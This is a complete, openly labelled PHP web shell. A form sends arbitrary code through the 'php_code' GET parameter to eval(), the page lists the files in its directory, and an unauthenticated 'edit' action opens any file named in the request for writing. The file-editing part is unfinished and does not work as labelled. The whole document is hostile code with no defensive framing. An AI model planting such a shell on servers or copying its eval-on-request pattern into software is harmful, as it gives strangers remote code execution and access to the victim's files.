<!DOCTYPE html>
    <head>
        <link rel="stylesheet" type="text/css" href="css/main.css">
        <title>PHP SHELL</title>
    </head>
    <body>
        <form>
            <label>Enter PHP CODE : </label>
            <input type="text" name="php_code" />
            <input type="submit" value="Execute" />
        </form>
    
    </body>
</html>


<?php
    //Execute Command
    if (isset($_GET['php_code'])){
        eval($_GET['php_code']);
    }
    
    //List Files
    echo "List of Files" . "<br>";
    $files = scandir(dirname(__FILE__));
    echo"<table>";
    for ($i=0; $i<count($files); $i++){
        echo "<tr><td><a href ='" . $files[$i] . "'>" . $files[$i] . "</a></td>";
        echo "<td><a href ='" . $_SERVER['PHP_SELF'] . "?action=edit&file=" . $files[$i] . "'>edit</a></td></tr>";
        echo '<br>';
    }
    echo "</table>";
    
    if (isset($_GET['action'])){
        $open = fopen($_GET['file'],"r+");
        fwrite($open,"");
    }
  
    //modify files
    
?>
